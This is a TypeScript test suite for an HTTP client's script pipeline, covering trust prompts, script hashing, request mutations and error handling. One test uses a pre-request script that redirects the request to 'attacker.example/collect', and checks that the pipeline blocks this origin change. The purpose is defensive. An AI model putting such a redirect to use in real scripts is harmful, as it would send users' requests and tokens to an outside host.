import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { DEFAULT_REQUEST } from '../../../src/renderer/src/types/request.js'
import { executeRequestWithScripts } from '../../../electron/http/requestPipeline.js'
import type { HttpResponseData } from '../../../src/renderer/src/types/request.js'
import type { ScriptRunner } from '../../../electron/http/scripts/types.js'

const okResponse: HttpResponseData = {
  status: 200,
  statusText: 'OK',
  headers: { 'content-type': 'application/json' },
  body: '{"token":"new"}',
  bodySize: 15,
  headerSize: 35,
  totalTime: 12,
  contentType: 'application/json',
  cookies: [],
  networkDetails: {
    overview: {
      method: 'GET',
      finalUrl: 'https://api.example.com',
      status: 200,
      statusText: 'OK',
      totalTime: 12,
      requestBodySize: 0,
      responseBodySize: 15,
      transferredSize: 50,
      protocol: 'HTTP/1.1'
    },
    request: {
      method: 'GET',
      originalUrl: 'https://api.example.com',
      finalUrl: 'https://api.example.com',
      queryString: [],
      headers: [],
      headerSize: 0,
      bodyPreview: '',
      bodySize: 0,
      bodyType: 'none',
      contentType: ''
    },
    response: {
      url: 'https://api.example.com',
      status: 200,
      statusText: 'OK',
      headers: [{ name: 'content-type', value: 'application/json' }],
      rawHeaders: { 'content-type': 'application/json' },
      headerSize: 35,
      bodySize: 15,
      contentType: 'application/json',
      cookies: [],
      protocol: 'HTTP/1.1'
    },
    timing: {
      totalMs: 12,
      waitingTtfbMs: 7,
      downloadMs: 5,
      accuracy: 'measured',
      unsupportedPhases: ['dns', 'connect', 'ssl']
    },
    redirects: []
  }
}


async function trustAllScripts(): Promise<boolean> {
  return true
}

describe('executeRequestWithScripts', () => {
  it('preserves the network details contract alongside legacy response fields', async () => {
    const result = await executeRequestWithScripts(
      {
        ...DEFAULT_REQUEST,
        url: 'https://api.example.com',
        scripts: {
          preRequest: '',
          postRequest: '',
          trusted: false
        }
      },
      {},
      {
        executeHttpRequest: async () => okResponse
      }
    )

    assert.equal(result.success, true)
    assert.equal(result.data?.status, 200)
    assert.equal(result.data?.headers['content-type'], 'application/json')
    assert.equal(result.data?.networkDetails?.overview.finalUrl, 'https://api.example.com')
    assert.equal(result.data?.networkDetails?.request.method, 'GET')
    assert.equal(result.data?.networkDetails?.response.protocol, 'HTTP/1.1')
    assert.equal(result.data?.networkDetails?.timing.totalMs, 12)
    assert.deepEqual(result.data?.networkDetails?.redirects, [])
  })

  it('runs pre-request script before HTTP execution and post-request script after response', async () => {
    const calls: string[] = []
    const runner: ScriptRunner = async (context) => {
      calls.push(context.phase)
      if (context.phase === 'pre-request') {
        return {
          status: 'passed',
          logs: [],
          durationMs: 1,
          mutations: {
            request: {
              headers: [{ action: 'set', key: 'Authorization', value: 'Bearer abc' }]
            },
            environment: [{ action: 'set', key: 'token', value: 'abc' }]
          }
        }
      }

      return {
        status: 'passed',
        logs: [],
        durationMs: 1,
        mutations: {
          request: {},
          environment: [{ action: 'set', key: 'session', value: 'new' }]
        }
      }
    }

    const result = await executeRequestWithScripts(
      {
        ...DEFAULT_REQUEST,
        url: 'https://api.example.com',
        scripts: {
          preRequest: 'pw.env.set("token", "abc")',
          postRequest: 'pw.env.set("session", "new")',
          trusted: false
        }
      },
      {},
      {
        runner,
        trustScripts: trustAllScripts,
        executeHttpRequest: async (request, envVars) => {
          calls.push('http')
          assert.deepEqual(request.headers, [{ key: 'Authorization', value: 'Bearer abc', enabled: true }])
          assert.deepEqual(envVars, { token: 'abc' })
          return okResponse
        }
      }
    )

    assert.deepEqual(calls, ['pre-request', 'http', 'post-request'])
    assert.equal(result.success, true)
    assert.equal(result.data?.status, 200)
    assert.deepEqual(result.scriptReport.environmentMutations, [
      { action: 'set', key: 'token', value: 'abc' },
      { action: 'set', key: 'session', value: 'new' }
    ])
  })

  it('blocks HTTP execution when script trust is denied', async () => {
    let executed = false

    const result = await executeRequestWithScripts(
      {
        ...DEFAULT_REQUEST,
        url: 'https://api.example.com',
        scripts: {
          preRequest: 'pw.console.log("blocked")',
          postRequest: '',
          trusted: true
        }
      },
      {},
      {
        trustScripts: async () => false,
        runner: async () => {
          throw new Error('runner should not execute')
        },
        executeHttpRequest: async () => {
          executed = true
          return okResponse
        }
      }
    )

    assert.equal(executed, false)
    assert.equal(result.success, false)
    assert.equal(result.error.code, 'SCRIPT_TRUST_REQUIRED')
  })

  it('passes the script content hash to the trust callback', async () => {
    let trustedHash = ''

    await executeRequestWithScripts(
      {
        ...DEFAULT_REQUEST,
        url: 'https://api.example.com',
        scripts: {
          preRequest: 'pw.console.log("hash me")',
          postRequest: '',
          trusted: true
        }
      },
      {},
      {
        trustScripts: async (_config, hash) => {
          trustedHash = hash
          return true
        },
        runner: async () => ({
          status: 'passed',
          logs: [],
          durationMs: 1,
          mutations: { request: {}, environment: [] }
        }),
        executeHttpRequest: async () => okResponse
      }
    )

    assert.match(trustedHash, /^[a-f0-9]{64}$/)
  })

  it('returns the HTTP response when post-request script fails', async () => {
    const result = await executeRequestWithScripts(
      {
        ...DEFAULT_REQUEST,
        url: 'https://api.example.com',
        scripts: {
          preRequest: '',
          postRequest: 'throw new Error("boom")',
          trusted: false
        }
      },
      {},
      {
        trustScripts: trustAllScripts,
        runner: async () => ({
          status: 'failed',
          logs: [],
          durationMs: 1,
          error: { message: 'boom' },
          mutations: { request: {}, environment: [] }
        }),
        executeHttpRequest: async () => okResponse
      }
    )

    assert.equal(result.success, true)
    assert.equal(result.data?.status, 200)
    assert.equal(result.data?.scriptReport?.postRequest.status, 'failed')
  })

  it('passes a request-scoped hash to the trust callback', async () => {
    let firstScope = ''
    let secondScope = ''

    const request = {
      ...DEFAULT_REQUEST,
      id: 'request-a',
      url: 'https://api.example.com/users',
      scripts: {
        preRequest: 'pw.console.log("scope")',
        postRequest: '',
        trusted: true
      }
    }

    await executeRequestWithScripts(request, {}, {
      trustScripts: async (_config, _hash, scope) => {
        firstScope = scope
        return true
      },
      runner: async () => ({
        status: 'passed',
        logs: [],
        durationMs: 1,
        mutations: { request: {}, environment: [] }
      }),
      executeHttpRequest: async () => okResponse
    })

    await executeRequestWithScripts({ ...request, id: 'request-b' }, {}, {
      trustScripts: async (_config, _hash, scope) => {
        secondScope = scope
        return true
      },
      runner: async () => ({
        status: 'passed',
        logs: [],
        durationMs: 1,
        mutations: { request: {}, environment: [] }
      }),
      executeHttpRequest: async () => okResponse
    })

    assert.match(firstScope, /^[a-f0-9]{64}$/)
    assert.match(secondScope, /^[a-f0-9]{64}$/)
    assert.notEqual(firstScope, secondScope)
  })

  it('reports request mutations and effective request metadata', async () => {
    const result = await executeRequestWithScripts(
      {
        ...DEFAULT_REQUEST,
        url: 'https://api.example.com/users',
        scripts: {
          preRequest: 'pw.request.setUrl("https://api.example.com/accounts")',
          postRequest: '',
          trusted: false
        }
      },
      {},
      {
        trustScripts: trustAllScripts,
        runner: async () => ({
          status: 'passed',
          logs: [],
          durationMs: 1,
          mutations: {
            request: {
              url: 'https://api.example.com/accounts',
              headers: [{ action: 'set', key: 'X-Script', value: '1' }]
            },
            environment: []
          }
        }),
        executeHttpRequest: async (request) => {
          assert.equal(request.url, 'https://api.example.com/accounts')
          return okResponse
        }
      }
    )

    assert.equal(result.success, true)
    assert.deepEqual(result.scriptReport.effectiveRequest, {
      method: 'GET',
      url: 'https://api.example.com/accounts'
    })
    assert.deepEqual(result.scriptReport.requestMutations, [
      { field: 'url' },
      { field: 'headers', action: 'set', key: 'X-Script' }
    ])
  })

  it('blocks pre-request scripts that change the request origin', async () => {
    let executed = false

    const result = await executeRequestWithScripts(
      {
        ...DEFAULT_REQUEST,
        url: 'https://api.example.com/users',
        scripts: {
          preRequest: 'pw.request.setUrl("https://attacker.example/collect")',
          postRequest: '',
          trusted: false
        }
      },
      {},
      {
        trustScripts: trustAllScripts,
        runner: async () => ({
          status: 'passed',
          logs: [],
          durationMs: 1,
          mutations: {
            request: { url: 'https://attacker.example/collect' },
            environment: []
          }
        }),
        executeHttpRequest: async () => {
          executed = true
          return okResponse
        }
      }
    )

    assert.equal(executed, false)
    assert.equal(result.success, false)
    assert.equal(result.error.code, 'PRE_REQUEST_SCRIPT_ORIGIN_CHANGED')
    assert.deepEqual(result.scriptReport.requestMutations, [{ field: 'url' }])
  })

  it('preserves pre-request script results when HTTP execution fails', async () => {
    const result = await executeRequestWithScripts(
      {
        ...DEFAULT_REQUEST,
        url: 'https://api.example.com',
        scripts: {
          preRequest: 'pw.env.set("token", "abc")',
          postRequest: '',
          trusted: false
        }
      },
      {},
      {
        trustScripts: trustAllScripts,
        runner: async () => ({
          status: 'passed',
          logs: [{ level: 'log', message: 'before request', timestamp: 1 }],
          durationMs: 1,
          mutations: { request: {}, environment: [{ action: 'set', key: 'token', value: 'abc' }] }
        }),
        executeHttpRequest: async () => {
          throw Object.assign(new Error('Network failed'), { code: 'NETWORK_ERROR' })
        }
      }
    )

    assert.equal(result.success, false)
    assert.equal(result.error.code, 'NETWORK_ERROR')
    assert.equal(result.scriptReport.preRequest.status, 'passed')
    assert.deepEqual(result.scriptReport.environmentMutations, [{ action: 'set', key: 'token', value: 'abc' }])
  })
})
